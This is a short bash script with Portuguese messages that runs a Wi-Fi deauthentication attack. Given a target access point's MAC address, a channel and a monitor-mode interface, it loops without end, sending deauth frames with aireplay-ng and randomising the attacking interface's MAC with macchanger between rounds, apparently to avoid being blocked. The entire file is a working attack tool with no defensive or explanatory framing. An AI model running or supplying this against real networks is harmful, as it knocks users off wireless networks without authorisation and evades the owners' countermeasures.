#!/usr/bin/env bash

green="\033[32;1m"
red="\033[31;1m"
orange="\033[33;1m"
cor="\033[m"

if [[ $# -lt 3 ]];then
   echo -e "Parâmetro incorreto use:\n${green}MAC DO ALVO ${orange}CANAL DO ALVO ${red}INTERFACE DE REDE ${cor}"
   echo -e "Exemplo: ./bypass ${green}AA:BB:CC:D0:W5:88 ${orange}11 ${red}wlan0mon ${cor}"
   
   exit 1
fi

echo -e "${green}PARA CESSAR O ATAQUE USE CTRL + C ${cor}"

while :; do
 iw dev $3 set channel $2
 echo -e "${red}`aireplay-ng --deauth 3 -a $1 $3 | grep "DeAuth"` ${cor}"
 	echo " "
 ip link set $3 down 
 echo -e "${green}`macchanger -r $3 | grep "New MAC"` ${cor}"
 	echo " "
 ip link set $3 up
 sleep 5s

done
